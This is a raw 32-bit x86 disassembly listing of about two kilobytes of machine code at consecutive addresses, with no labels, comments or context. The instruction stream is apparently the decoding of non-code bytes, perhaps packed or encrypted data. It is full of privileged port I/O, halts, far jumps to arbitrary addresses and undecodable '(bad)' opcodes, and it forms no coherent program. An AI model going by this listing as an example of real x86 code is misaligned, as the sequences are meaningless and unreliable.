  4226b5:	clc    
  4226b6:	or     eax,0x2aea87a2
  4226bb:	inc    ebx
  4226bc:	repz sbb esp,DWORD PTR [esi-0x3a63a11d]
  4226c3:	jmp    0x42265a
  4226c5:	mov    ebp,ss
  4226c7:	test   DWORD PTR [ecx+ebx*8+0x7],ecx
  4226cb:	or     al,0xbc
  4226cd:	out    dx,eax
  4226ce:	and    al,0x13
  4226d0:	cmp    al,0x1d
  4226d2:	pop    ebx
  4226d3:	mov    eax,ds:0xbd938b3d
  4226d8:	fldcw  WORD PTR [eax-0x114308ed]
  4226de:	mov    ch,0xff
  4226e0:	or     BYTE PTR [eax-0x14],cl
  4226e3:	clc    
  4226e4:	js     0x42272c
  4226e6:	sub    DWORD PTR [edi-0x7201a73d],0xfbad5048
  4226f0:	jl     0x4226d8
  4226f2:	loope  0x422739
  4226f4:	add    dh,0x68
  4226f7:	jecxz  0x422764
  4226f9:	fsub   st(7),st
  4226fb:	adc    eax,0x6bee46c1
  422700:	ins    BYTE PTR es:[edi],dx
  422701:	jmp    0x9b8b4c04
  422706:	mov    DWORD PTR [esp+ebx*1-0xb53241],0x8c410dba
  422711:	xor    edx,ebp
  422713:	mov    eax,0x2a1c914d
  422718:	dec    eax
  422719:	ror    DWORD PTR [eax+0x2a],0x5
  42271d:	jb     0x4226bd
  42271f:	inc    esi
  422720:	rcr    DWORD PTR [ebx+0x5abcd709],1
  422726:	mov    eax,0x28f2c3db
  42272b:	cmp    al,0x20
  42272d:	xor    BYTE PTR [esi+ebx*1],bl
  422730:	scas   al,BYTE PTR es:[edi]
  422731:	rcl    DWORD PTR [esi-0x53548bfe],0x1e
  422738:	not    DWORD PTR [edi+esi*4]
  42273b:	push   ss
  42273c:	or     BYTE PTR [esi],0x98
  42273f:	out    dx,al
  422740:	lahf   
  422741:	adc    eax,0x298b5e37
  422746:	dec    ebx
  422747:	hlt    
  422748:	ja     0x422736
  42274a:	xchg   ebx,eax
  42274b:	mov    esi,0xf93e9dca
  422750:	sbb    al,0xf4
  422752:	jbe    0x42277a
  422754:	sbb    esi,DWORD PTR ds:0x6664f4c5
  42275a:	jno    0x42272d
  42275c:	mov    edi,0xd1570cfa
  422761:	aad    0xab
  422763:	mov    WORD PTR [eax+0x4bc1e1b],es
  422769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42276a:	loop   0x4226fe
  42276c:	es cld 
  42276e:	fldcw  WORD PTR [edi+eax*1-0x42]
  422772:	icebp  
  422773:	pop    esp
  422774:	push   ds
  422775:	cs sti 
  422777:	iret   
  422778:	imul   eax,DWORD PTR [edx+0x4e],0x52
  42277c:	dec    ecx
  42277d:	call   0xe9e9:0x61e3703c
  422784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422785:	outs   dx,BYTE PTR ds:[esi]
  422786:	cwde   
  422787:	sub    bl,BYTE PTR [ebx+0x6b]
  42278a:	sbb    BYTE PTR [esi+0x36d211b4],cl
  422790:	sub    edi,DWORD PTR [ebp-0x2]
  422793:	xchg   ebp,eax
  422794:	loope  0x4227c7
  422796:	pop    ebx
  422797:	cwde   
  422798:	jnp    0x422742
  42279a:	sub    edi,DWORD PTR [eax+eax*1+0x20]
  42279e:	mov    WORD PTR [edx+edi*2-0x4f61b01c],?
  4227a5:	jbe    0x42273a
  4227a7:	pop    ss
  4227a8:	mov    edi,0xd3334cc2
  4227ad:	out    dx,eax
  4227ae:	or     eax,0x92cee5
  4227b3:	retf   0x3580
  4227b6:	xchg   edi,eax
  4227b7:	mov    ecx,0x11e1fd17
  4227bc:	inc    esi
  4227bd:	les    edx,FWORD PTR [esi-0x2674c47d]
  4227c3:	loope  0x4227be
  4227c5:	adc    DWORD PTR [edi],0x54cd7959
  4227cb:	push   ebp
  4227cc:	pushf  
  4227cd:	adc    BYTE PTR [ebx-0x80],ch
  4227d0:	aad    0x40
  4227d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d3:	aaa    
  4227d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227d5:	pop    ebp
  4227d6:	xchg   ebx,eax
  4227d7:	or     ebp,esi
  4227d9:	sub    DWORD PTR [eax],ebx
  4227db:	imul   ebp,DWORD PTR ds:0x43a8f514,0x9b292142
  4227e5:	sahf   
  4227e6:	mov    ds:0x538d5277,eax
  4227eb:	xor    al,0x74
  4227ed:	sub    bl,cl
  4227ef:	mov    dh,0x59
  4227f1:	ins    BYTE PTR es:[edi],dx
  4227f2:	sbb    ebp,DWORD PTR [eax+0x5c]
  4227f5:	xor    DWORD PTR [edi],edx
  4227f7:	push   ss
  4227f8:	(bad)  
  4227f9:	jl     0x4227e5
  4227fb:	jne    0x42279c
  4227fd:	in     eax,0x2c
  4227ff:	inc    edi
  422800:	inc    esi
  422801:	data16 mov dh,0x40
  422804:	pop    esi
  422805:	adc    eax,0x1f97db7
  42280a:	mov    cl,0x14
  42280c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42280d:	mov    ah,0x94
  42280f:	cwde   
  422810:	in     al,0x10
  422812:	jo     0x422853
  422814:	test   edi,ebp
  422816:	push   ebx
  422817:	push   cs
  422818:	in     al,0x6
  42281a:	xlat   BYTE PTR ds:[ebx]
  42281b:	xchg   ecx,eax
  42281c:	mov    esi,DWORD PTR [edx+0x631fad87]
  422822:	std    
  422823:	push   0xd18a4431
  422828:	add    DWORD PTR [esi],edi
  42282a:	in     al,dx
  42282b:	jmp    0x69986d1e
  422830:	push   esi
  422831:	fs xor dl,bl
  422834:	sub    DWORD PTR [ecx-0x66],esi
  422837:	jno    0x422884
  422839:	sub    dh,BYTE PTR [edi+0x16]
  42283c:	mov    edi,0xf73fb468
  422841:	scas   al,BYTE PTR es:[edi]
  422842:	pop    ebp
  422843:	in     eax,dx
  422844:	xchg   edi,eax
  422845:	je     0x42283a
  422847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422848:	pop    edi
  422849:	hlt    
  42284a:	inc    esp
  42284b:	and    cl,BYTE PTR [ebp-0x10ce7843]
  422851:	jl     0x422803
  422853:	dec    ebp
  422854:	imul   ebx,DWORD PTR [ecx],0x8c3faec5
  42285a:	cld    
  42285b:	ror    BYTE PTR [edi+0x66],0x8e
  42285f:	mov    DWORD PTR [esi],0x10d4f0a6
  422865:	jnp    0x422814
  422867:	xchg   esp,eax
  422868:	xor    cl,cl
  42286a:	aas    
  42286b:	add    ebx,DWORD PTR [esi+ecx*8]
  42286e:	scas   al,BYTE PTR es:[edi]
  42286f:	fidivr DWORD PTR [eax]
  422871:	sub    BYTE PTR [eax-0x590e58b2],0x7d
  422878:	int3   
  422879:	lds    ebp,FWORD PTR [edx+0x5e44414]
  42287f:	jecxz  0x4228ee
  422881:	push   ss
  422882:	adc    DWORD PTR [eax-0x28],esp
  422885:	cwde   
  422886:	sbb    DWORD PTR [esi-0x33],ebp
  422889:	inc    ebx
  42288a:	jmp    0x409b:0x83e2baa4
  422891:	mov    es,WORD PTR [edx]
  422893:	push   ebx
  422894:	in     eax,dx
  422895:	out    0x8a,al
  422897:	in     ax,dx
  422899:	(bad)  
  42289a:	and    esi,ebp
  42289c:	pop    eax
  42289d:	push   eax
  42289e:	jp     0x42288f
  4228a0:	pop    ecx
  4228a1:	stos   BYTE PTR es:[edi],al
  4228a2:	icebp  
  4228a3:	mov    edx,0x307128ba
  4228a8:	sub    edi,DWORD PTR [ebx]
  4228aa:	mov    eax,DWORD PTR [eax-0x6d04b0a8]
  4228b0:	dec    ebx
  4228b1:	jno    0x42284d
  4228b3:	imul   edx,DWORD PTR [eax],0xffffffd4
  4228b6:	test   DWORD PTR [ecx+0x28],ebp
  4228b9:	add    BYTE PTR [eax],al
  4228bb:	add    al,bh
  4228bd:	mov    ah,0x7f
  4228bf:	cmp    eax,0xf5faff7f
  4228c4:	jle    0x4228c8
  4228c6:	xor    eax,DWORD PTR [esi-0x42]
  4228c9:	mov    eax,0xa37a1d71
  4228ce:	add    DWORD PTR [eax],eax
  4228d0:	test   DWORD PTR [edx],eax
  4228d2:	add    BYTE PTR [eax],al
  4228d4:	pushf  
  4228d5:	cmc    
  4228d6:	and    eax,0x1c528031
  4228db:	lahf   
  4228dc:	pop    ebp
  4228dd:	or     al,0xf8
  4228df:	fld    TBYTE PTR [edx+0x39ab1cf0]
  4228e5:	call   0x43fed854
  4228ea:	test   eax,0xaadc5a9
  4228ef:	test   BYTE PTR [ecx],0xdc
  4228f2:	leave  
  4228f3:	push   edx
  4228f4:	sahf   
  4228f5:	sub    eax,0xb0b88c47
  4228fa:	scas   al,BYTE PTR es:[edi]
  4228fb:	mov    edi,esi
  4228fd:	pushf  
  4228fe:	mov    ecx,0xd746055c
  422903:	push   0x7e
  422905:	lock out dx,eax
  422907:	or     ebx,DWORD PTR [edi+0xe]
  42290a:	clc    
  42290b:	pusha  
  42290c:	and    BYTE PTR [eax+0xd],bl
  42290f:	mov    ds:0xe8d084f0,eax
  422914:	in     al,0x42
  422916:	pop    ds
  422917:	shr    BYTE PTR [edi+0x31],1
  42291a:	dec    esp
  42291b:	dec    edi
  42291c:	jnp    0x4228fd
  42291e:	pop    esi
  42291f:	mov    ebx,0x614813ac
  422924:	mov    dh,0xc6
  422926:	sub    al,0xfa
  422928:	jbe    0x42290b
  42292a:	je     0x422973
  42292c:	cmp    ch,BYTE PTR [edi-0x5b]
  42292f:	push   edi
  422930:	xor    dh,BYTE PTR [ebp+0x1f]
  422933:	xlat   BYTE PTR ds:[ebx]
  422934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422935:	lahf   
  422936:	mov    dh,0x21
  422938:	sbb    BYTE PTR [edi-0x441bbabe],cl
  42293e:	push   cs
  42293f:	mov    esi,0x51db351e
  422944:	sbb    al,0x5c
  422946:	pop    DWORD PTR [ebx]
  422948:	sti    
  422949:	rcl    BYTE PTR [eax-0x4d],1
  42294c:	in     eax,0x24
  42294e:	sbb    al,0xd4
  422950:	mov    esp,0x7f9075fd
  422955:	cmc    
  422956:	sub    al,0x7b
  422958:	xchg   esp,eax
  422959:	ins    DWORD PTR es:[edi],dx
  42295a:	inc    eax
  42295b:	sbb    al,BYTE PTR [eax+0x7a]
  42295e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42295f:	daa    
  422960:	outs   dx,BYTE PTR ds:[esi]
  422961:	in     eax,0x8f
  422963:	push   es
  422964:	mov    edi,0xce16e00e
  422969:	(bad)  
  42296a:	std    
  42296b:	jnp    0x422936
  42296d:	sbb    DWORD PTR [edx],ebx
  42296f:	sub    al,0x87
  422971:	add    DWORD PTR [ecx],edx
  422973:	add    DWORD PTR [ecx-0x22],esp
  422976:	out    0x6,eax
  422978:	pop    esi
  422979:	into   
  42297a:	adc    al,0xf5
  42297c:	out    0xa7,al
  42297e:	je     0x42290f
  422980:	jno    0x4229fc
  422982:	mov    cs,ecx
  422984:	mov    bh,0x41
  422986:	loopne 0x4229f5
  422988:	jl     0x422970
  42298a:	mov    edi,0x285d3567
  42298f:	pop    ebp
  422990:	in     eax,dx
  422991:	fisttp QWORD PTR [eax*1-0x59c490f8]
  422998:	es jo  0x42294b
  42299b:	jb     0x422950
  42299d:	cmp    DWORD PTR [ebp+0x11b4f061],esp
  4229a3:	hlt    
  4229a4:	xor    edx,edi
  4229a6:	fsubr  DWORD PTR [edx-0x15]
  4229a9:	cmp    eax,0x8997f790
  4229ae:	xchg   BYTE PTR [edx+0x21ddc22e],dh
  4229b4:	push   ebp
  4229b5:	ror    DWORD PTR [eax+eax*4],0x20
  4229b9:	inc    ecx
  4229ba:	sub    DWORD PTR [edx+ecx*8-0x23],esi
  4229be:	xor    bl,BYTE PTR [edi-0x12b3b831]
  4229c4:	out    0xda,al
  4229c6:	ins    DWORD PTR es:[edi],dx
  4229c7:	(bad)  
  4229c8:	test   DWORD PTR [eax-0x27968684],esi
  4229ce:	sub    ebx,DWORD PTR [ecx+0x16]
  4229d1:	and    eax,0xa1154159
  4229d6:	bound  edx,QWORD PTR [ebx+0x5b]
  4229d9:	daa    
  4229da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229db:	inc    ebx
  4229dc:	jo     0x422a4b
  4229de:	adc    bh,bl
  4229e0:	or     DWORD PTR [eax],ecx
  4229e2:	sub    eax,ebp
  4229e4:	into   
  4229e5:	ds out dx,eax
  4229e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229e8:	lds    esp,FWORD PTR [eax-0x21]
  4229eb:	push   es
  4229ec:	(bad)  [ecx+0x15695d3d]
  4229f2:	out    dx,eax
  4229f3:	jns    0x4229ec
  4229f5:	push   0x2e
  4229f7:	test   bl,dh
  4229f9:	clc    
  4229fa:	push   ebx
  4229fb:	jae    0x422a26
  4229fd:	pop    esi
  4229fe:	std    
  4229ff:	cs or  al,0x7c
  422a02:	pushf  
  422a03:	retf   0xb595
  422a06:	mov    al,0x56
  422a08:	lds    ecx,FWORD PTR [ebx-0x75]
  422a0b:	xchg   esp,eax
  422a0c:	shl    ebx,0x6c
  422a0f:	ret    0xb433
  422a12:	xor    DWORD PTR [eax+ebp*2-0x4f89bd6],ebp
  422a19:	mov    al,ds:0xc4cc4cb2
  422a1e:	xor    BYTE PTR [ecx+0x7d65cede],cl
  422a24:	fld    TBYTE PTR cs:[edx+0x61]
  422a28:	ja     0x422a13
  422a2a:	(bad)  
  422a2b:	dec    esi
  422a2c:	dec    edi
  422a2d:	sbb    ch,al
  422a2f:	test   DWORD PTR [edi+ebx*4],eax
  422a32:	adc    DWORD PTR [ebx+0x36cdc2bb],0x9b313f13
  422a3c:	jbe    0x422a80
  422a3e:	push   sp
  422a40:	or     al,0xb8
  422a42:	jo     0x422a95
  422a44:	push   0x26
  422a46:	add    eax,0x45dc24f4
  422a4b:	scas   al,BYTE PTR es:[edi]
  422a4c:	enter  0x3bf0,0xa6
  422a50:	mov    dh,0x93
  422a52:	stos   DWORD PTR es:[edi],eax
  422a53:	(bad)  
  422a54:	retf   0xb7f2
  422a57:	adc    al,0x62
  422a59:	das    
  422a5a:	in     eax,dx
  422a5b:	cmp    al,0x13
  422a5d:	fs push 0x2f44d762
  422a63:	cld    
  422a64:	retf   
  422a65:	(bad)  
  422a66:	in     al,dx
  422a67:	ret    0xf221
  422a6a:	lea    eax,[ebx+0x51cf04df]
  422a70:	jne    0x422a0d
  422a72:	fdiv   DWORD PTR [esi+0xd]
  422a75:	xor    BYTE PTR [esi+0x57649d99],al
  422a7b:	sub    al,0x88
  422a7d:	jmp    0x422a82
  422a7f:	mov    eax,0x88349207
  422a84:	pusha  
  422a85:	push   ds
  422a86:	aas    
  422a87:	adc    edx,DWORD PTR [edi+0x44b78220]
  422a8d:	sbb    eax,0x6baccab5
  422a92:	push   edx
  422a93:	jg     0x422ab5
  422a95:	cmp    dl,bl
  422a97:	repz es leave 
  422a9a:	pop    esi
  422a9b:	(bad)  
  422a9c:	jmp    0x422ad3
  422a9e:	loope  0x422ac8
  422aa0:	je     0x422b1c
  422aa2:	pop    eax
  422aa3:	xchg   ecx,eax
  422aa4:	jle    0x422b04
  422aa6:	xchg   ecx,eax
  422aa7:	mov    BYTE PTR [esi+0x25fbb046],al
  422aad:	ss repz pushf 
  422ab0:	ret    
  422ab1:	mov    ss,ebx
  422ab3:	hlt    
  422ab4:	mov    ds:0x6f0970a2,eax
  422ab9:	daa    
  422aba:	push   cs
  422abb:	adc    cl,BYTE PTR [edx+0x45331baf]
  422ac1:	push   eax
  422ac2:	xchg   edi,eax
  422ac3:	mov    DWORD PTR [ebx],edx
  422ac5:	sub    edx,ebp
  422ac7:	add    edx,DWORD PTR [edx-0xb50f7b9]
  422acd:	inc    ebx
  422ace:	fs std 
  422ad0:	sbb    ah,BYTE PTR [ebp+0x4063d68]
  422ad6:	out    dx,eax
  422ad7:	into   
  422ad8:	dec    ebx
  422ad9:	outs   dx,DWORD PTR ds:[esi]
  422ada:	mov    al,ds:0x68e30c68
  422adf:	pop    ds
  422ae0:	xor    dh,ah
  422ae2:	dec    edx
  422ae3:	out    0xda,eax
  422ae5:	jns    0x422aca
  422ae7:	mov    eax,0xca5d6a58
  422aec:	in     al,dx
  422aed:	stos   DWORD PTR es:[edi],eax
  422aee:	dec    esp
  422aef:	push   ds
  422af0:	idiv   DWORD PTR [edi+0x1d]
  422af3:	loopne 0x422af6
  422af5:	lea    eax,[esi+0x5b1f217e]
  422afb:	fwait
  422afc:	popf   
  422afd:	loop   0x422b48
  422aff:	xor    esp,DWORD PTR [edx+0x4b]
  422b02:	adc    BYTE PTR [ebx],dh
  422b04:	scas   eax,DWORD PTR es:[edi]
  422b05:	pop    es
  422b06:	(bad)  
  422b07:	adc    esi,esi
  422b09:	repnz xchg ebp,eax
  422b0b:	jo     0x422ad7
  422b0d:	mov    ecx,0x8d3d7b3b
  422b12:	gs push edi
  422b14:	push   eax
  422b15:	cmp    eax,0x609db217
  422b1a:	bound  edx,QWORD PTR [edx+0x440faf91]
  422b20:	xchg   ebp,eax
  422b21:	test   DWORD PTR [ebp+eiz*8-0x2f],0xc8d20f06
  422b29:	mov    bh,0xf8
  422b2b:	pop    esi
  422b2c:	lea    ebx,[ecx+0x5d933f10]
  422b32:	fild   DWORD PTR [ebp-0x65]
  422b35:	loop   0x422b7b
  422b37:	jge    0x422b0c
  422b39:	das    
  422b3a:	ins    BYTE PTR es:[edi],dx
  422b3b:	dec    esp
  422b3c:	int3   
  422b3d:	mov    eax,DWORD PTR [edx-0x446ae68f]
  422b43:	jmp    0x422b56
  422b45:	add    DWORD PTR [edi+0x55],esi
  422b48:	int3   
  422b49:	and    edi,DWORD PTR [esi+0x52cbddf0]
  422b4f:	aas    
  422b50:	pop    ss
  422b51:	push   ss
  422b52:	lds    edi,FWORD PTR [ebp-0x21c1c82e]
  422b58:	add    BYTE PTR [eax],al
  422b5a:	add    BYTE PTR [eax],al
  422b5c:	cmp    DWORD PTR [ecx+ecx*4],ebx
  422b5f:	out    0xad,eax
  422b61:	idiv   DWORD PTR [edi-0x22]
  422b64:	mov    DWORD PTR [edx+0x79],ebp
  422b67:	adc    DWORD PTR [ecx+0x57],0xa5ff61be
  422b6e:	add    DWORD PTR [eax],eax
  422b70:	test   DWORD PTR [edx],eax
  422b72:	add    BYTE PTR [eax],al
  422b74:	lock xchg ebp,eax
  422b76:	bnd jo 0x422bd8
  422b79:	call   0xe9858a9a
  422b7e:	mov    eax,ds:0xa70e938f
  422b83:	sub    BYTE PTR ds:0x7ed7e58b,bl
  422b89:	sub    al,bh
  422b8b:	ins    DWORD PTR es:[edi],dx
  422b8c:	mov    al,ds:0xe565c488
  422b91:	neg    DWORD PTR [esi+0x8a3143f]
  422b97:	xor    BYTE PTR [ecx+0x6acd69e7],0x82
  422b9e:	xchg   ebx,eax
  422b9f:	ret    
  422ba0:	dec    esp
  422ba1:	packuswb mm1,QWORD PTR [edi]
  422ba4:	dec    edi
  422ba5:	je     0x422b30
  422ba7:	mov    eax,ds:0x5df51232
  422bac:	fisttp QWORD PTR [esi-0x24]
  422baf:	lods   eax,DWORD PTR ds:[esi]
  422bb0:	imul   esi,DWORD PTR [eax-0x23],0xffffffa3
  422bb4:	push   ecx
  422bb5:	xchg   ebx,eax
  422bb6:	outs   dx,BYTE PTR ds:[esi]
  422bb7:	push   ecx
  422bb8:	jnp    0x422bca
  422bba:	out    dx,eax
  422bbb:	adc    eax,0xfc844577
  422bc0:	cli    
  422bc1:	mov    bl,0x69
  422bc3:	inc    eax
  422bc4:	xchg   edx,eax
  422bc5:	pop    ds
  422bc6:	test   DWORD PTR [ecx+0x75d42d7a],0xe1ffdb50
  422bd0:	adc    al,0x93
  422bd2:	xor    dh,BYTE PTR [edx+0x7d23e406]
  422bd8:	out    dx,al
  422bd9:	ret    
  422bda:	lea    ebx,[edi-0x5a]
  422bdd:	jl     0x422c27
  422bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be0:	or     ebp,DWORD PTR [eax]
  422be2:	xchg   ebp,eax
  422be3:	es loopne 0x422c0c
  422be6:	push   esi
  422be7:	mov    ecx,esi
  422be9:	mov    edx,0x2914a839
  422bee:	adc    BYTE PTR [edi],0x2a
  422bf1:	mov    dl,0x8b
  422bf3:	and    cl,BYTE PTR [ecx]
  422bf5:	lods   eax,DWORD PTR ds:[esi]
  422bf6:	leave  
  422bf7:	or     al,0x6b
  422bf9:	dec    esp
  422bfa:	and    esi,DWORD PTR [esi]
  422bfc:	out    dx,al
  422bfd:	sub    ebx,eax
  422bff:	(bad)  
  422c01:	data16 sbb BYTE PTR [esi],bl
  422c04:	mov    bl,0xa8
  422c06:	jno    0x422c2d
  422c08:	xlat   BYTE PTR ds:[ebx]
  422c09:	je     0x422be9
  422c0b:	arpl   bx,si
  422c0d:	inc    edx
  422c0e:	or     cl,BYTE PTR [eax-0x363cc5f0]
  422c14:	mov    DWORD PTR [edi-0x7f10a7a7],edi
  422c1a:	add    eax,0x49d7c1e0
  422c1f:	sub    eax,0x7c268b6b
  422c24:	outs   dx,DWORD PTR ds:[esi]
  422c25:	fsubrp st(7),st
  422c27:	mov    esi,0x1619a3f3
  422c2c:	jp     0x422bb9
  422c2e:	and    DWORD PTR [ecx-0x33],edx
  422c31:	adc    eax,0x7b4c77e7
  422c36:	cmp    ebx,DWORD PTR [edx]
  422c38:	push   0x16
  422c3a:	sbb    BYTE PTR [edi+0x18],0x38
  422c3e:	adc    al,BYTE PTR [esi+0x803cdc8]
  422c44:	ffree  st(4)
  422c46:	mov    al,ds:0x586ae41
  422c4b:	jo     0x422bd9
  422c4d:	inc    DWORD PTR [eax-0x2b6dd7fa]
  422c53:	or     esi,DWORD PTR [ebx]
  422c55:	(bad)  
  422c57:	mov    esi,0x57eed925
  422c5c:	scas   eax,DWORD PTR es:[edi]
  422c5d:	pop    ss
  422c5e:	mov    al,0x7d
  422c60:	data16 mov al,0xbf
  422c63:	pop    ds
  422c64:	dec    ebx
  422c65:	and    DWORD PTR [ecx-0x68],ebx
  422c68:	cli    
  422c69:	loop   0x422c3c
  422c6b:	xchg   edi,eax
  422c6c:	pusha  
  422c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c6e:	adc    BYTE PTR [esi+esi*1+0x6705bab0],bl
  422c75:	mov    ds:0xf71e3062,eax
  422c7a:	rcr    DWORD PTR [edx+ebp*4+0x43],cl
  422c7e:	test   DWORD PTR [ecx-0x13],edi
  422c81:	jns    0x422cf3
  422c83:	sub    BYTE PTR [ecx],dh
  422c85:	stos   DWORD PTR es:[edi],eax
  422c86:	add    DWORD PTR [esi+ebx*2-0x7503be6c],eax
  422c8d:	loope  0x422cee
  422c8f:	cmp    eax,0xa07a89c7
  422c94:	cmp    cl,0xaa
  422c97:	xchg   esp,eax
  422c98:	and    eax,0x809dffda
  422c9d:	jno    0x422c84
  422c9f:	pusha  
  422ca0:	pusha  
  422ca1:	fcomp  QWORD PTR [ebx+eiz*8]
  422ca4:	ds loope 0x422ccb
  422ca7:	pop    ebx
  422ca8:	add    BYTE PTR [ebp+0x30],al
  422cab:	sub    edi,eax
  422cad:	xchg   esp,eax
  422cae:	mov    ebx,0x9259124b
  422cb3:	sub    DWORD PTR [ecx+0x54],0x57
  422cb7:	test   al,0x6d
  422cb9:	pop    edx
  422cba:	mov    dh,0xec
  422cbc:	xor    al,0xeb
  422cbe:	fwait
  422cbf:	adc    al,0x1a
  422cc1:	push   0xffffffb6
  422cc3:	ficomp WORD PTR [esi+eax*2]
  422cc6:	pop    ebx
  422cc7:	in     al,0xd7
  422cc9:	jbe    0x422ce9
  422ccb:	xchg   edi,eax
  422ccc:	push   0x18
  422cce:	cmp    al,0xb7
  422cd0:	xchg   edx,eax
  422cd1:	nop
  422cd2:	and    BYTE PTR [edx-0x179c3674],cl
  422cd8:	leave  
  422cd9:	(bad)  
  422cda:	mov    ds:0xe334247b,eax
  422cdf:	je     0x422d03
  422ce1:	out    0x9e,al
  422ce3:	mov    ds:0x853a5160,eax
  422ce8:	inc    BYTE PTR [edx-0x27]
  422ceb:	mov    ah,0xec
  422ced:	mov    ebp,0x388851d8
  422cf2:	mov    ch,0x63
  422cf4:	push   cs
  422cf5:	inc    ebp
  422cf6:	dec    esi
  422cf7:	sbb    ah,BYTE PTR [ebx+0x72191679]
  422cfd:	xor    DWORD PTR [bp+si-0x71ef],esi
  422d02:	(bad)  
  422d03:	push   ebp
  422d04:	fisub  DWORD PTR [edx+0x66]
  422d07:	lods   eax,DWORD PTR ds:[esi]
  422d08:	mov    bl,0x1d
  422d0a:	lea    esp,ds:0xfef8fbab
  422d10:	add    al,0xe7
  422d12:	inc    esi
  422d13:	mov    eax,ds:0xb88a5dfe
  422d18:	mul    BYTE PTR [ebp+0x7c]
  422d1b:	adc    al,0xac
  422d1d:	bound  eax,QWORD PTR [ecx-0x6d278096]
  422d23:	jge    0x422cf2
  422d25:	push   ds
  422d26:	ins    BYTE PTR es:[edi],dx
  422d27:	fnsave [edx+ebx*1]
  422d2a:	add    al,0x85
  422d2c:	in     al,dx
  422d2d:	add    BYTE PTR [edx-0x5f],cl
  422d30:	inc    esp
  422d31:	jbe    0x422d43
  422d33:	loope  0x422d47
  422d35:	adc    ecx,esi
  422d37:	sub    BYTE PTR [ebx+edi*4+0x28],ch
  422d3b:	jo     0x422cda
  422d3d:	mov    edx,0x42e47b0d
  422d42:	(bad)  
  422d43:	mov    al,ds:0x9d1f0734
  422d48:	popf   
  422d49:	cwde   
  422d4a:	fidivr WORD PTR [ecx+0xd807d67]
  422d50:	mov    esp,DWORD PTR [edx+0x76]
  422d53:	lock sbb BYTE PTR [ebx+0x38d6c083],bl
  422d5a:	test   esp,0x23abc7b3
  422d60:	iret   
  422d61:	jb     0x422d06
  422d63:	daa    
  422d64:	pop    ebp
  422d65:	lods   al,BYTE PTR ds:[esi]
  422d66:	clc    
  422d67:	imul   ebx,DWORD PTR [ecx-0x80],0x54
  422d6b:	sbb    edi,edx
  422d6d:	or     al,0x4e
  422d6f:	pop    esp
  422d70:	push   eax
  422d71:	sbb    eax,eax
  422d73:	cli    
  422d74:	(bad)  
  422d75:	cmp    al,0xeb
  422d77:	or     bh,BYTE PTR [eax-0x2b]
  422d7a:	out    0x7a,eax
  422d7c:	mov    cl,0x62
  422d7e:	inc    edx
  422d7f:	imul   ecx,eax,0x96ce2df2
  422d85:	jmp    0x14e4:0xd60594e7
  422d8c:	addr16 push 0x24a9aaf3
  422d92:	pop    ds
  422d93:	or     ebp,DWORD PTR [edx+ebx*1+0x3f29043e]
  422d9a:	adc    bh,ch
  422d9c:	stos   DWORD PTR es:[edi],eax
  422d9d:	fistp  QWORD PTR [ebx+eax*4-0x40]
  422da1:	mov    BYTE PTR [ebp-0x603f80f2],dl
  422da7:	mov    eax,edx
  422da9:	adc    ebp,DWORD PTR [ebx+esi*1-0x3be30fcb]
  422db0:	call   0x49e4:0x3871fefa
  422db7:	jbe    0x422d68
  422db9:	lods   eax,DWORD PTR ds:[esi]
  422dba:	call   0x8318eacb
  422dbf:	sub    BYTE PTR [eax],0x3
  422dc2:	test   eax,0x12d8bb51
  422dc7:	je     0x422d81
  422dc9:	ja     0x422dcd
  422dcb:	imul   ecx,edx,0xffffff97
  422dce:	retf   
  422dcf:	adc    dh,dl
  422dd1:	std    
  422dd2:	sahf   
  422dd3:	ds mov ch,0xc5
  422dd6:	inc    esi
  422dd7:	shr    ah,0x24
  422dda:	xchg   BYTE PTR [ebx-0x62],ah
  422ddd:	repz frstor [ecx+0x3379c9f5]
  422de4:	xchg   esp,eax
  422de5:	mov    bh,0xd
  422de7:	and    al,0xb1
  422de9:	maxps  xmm5,xmm5
  422dec:	sbb    eax,0x89a12703
  422df1:	mov    ebx,0xb798b8eb
  422df6:	jg     0x422e42
  422df8:	push   ebx
  422df9:	add    BYTE PTR [eax],al
  422dfb:	add    BYTE PTR [ebp-0x4c],ah
  422dfe:	sbb    dh,bl
  422e00:	fsin   
  422e02:	out    0xbf,eax
  422e04:	gs mov ah,0x46
  422e07:	idiv   BYTE PTR [edi-0x6e]
  422e0a:	mov    eax,ds:0x1a88438
  422e0f:	add    BYTE PTR [ebp-0x27fffffe],al
  422e15:	sahf   
  422e16:	sbb    al,0x9c
  422e18:	pop    ecx
  422e19:	fwait
  422e1a:	mov    edi,0xeb1939fe
  422e1f:	push   eax
  422e20:	xor    eax,0x12723d7f
  422e25:	dec    ebp
  422e26:	arpl   WORD PTR [esi],dx
  422e28:	add    dh,ah
  422e2a:	inc    eax
  422e2b:	dec    ecx
  422e2c:	inc    ebx
  422e2d:	mov    ch,0xf
  422e2f:	test   eax,0xefe60
  422e34:	arpl   WORD PTR [esi-0x48],bx
  422e37:	ret    0x3ff7
  422e3a:	push   ebp
  422e3b:	sub    cl,BYTE PTR ds:0x257576f4
  422e41:	inc    ebx
  422e42:	int3   
  422e43:	or     ebp,DWORD PTR [esi+ebp*1-0x5d]
  422e47:	sub    BYTE PTR [ecx],bl
  422e49:	adc    DWORD PTR [esi+0x3512886f],0xfffffff6
  422e50:	cmp    DWORD PTR [edi-0x3b],0x69895d73
  422e57:	cmp    al,BYTE PTR [ebp-0x7c]
  422e5a:	dec    esi
  422e5b:	es jo  0x422e69
  422e5e:	rcr    edx,1
  422e60:	mov    bl,0xf5
  422e62:	adc    dl,0xec
  422e65:	lock sti 
  422e67:	retf   
  422e68:	xchg   edi,eax
  422e69:	sub    al,al
  422e6b:	gs fstp QWORD PTR ss:0x58199659
  422e73:	cmc    
  422e74:	mov    edx,0x4423c4c9
  422e79:	mov    dl,0x22
  422e7b:	int    0xc5
  422e7d:	adc    al,BYTE PTR [ecx]
  422e7f:	ds push cs
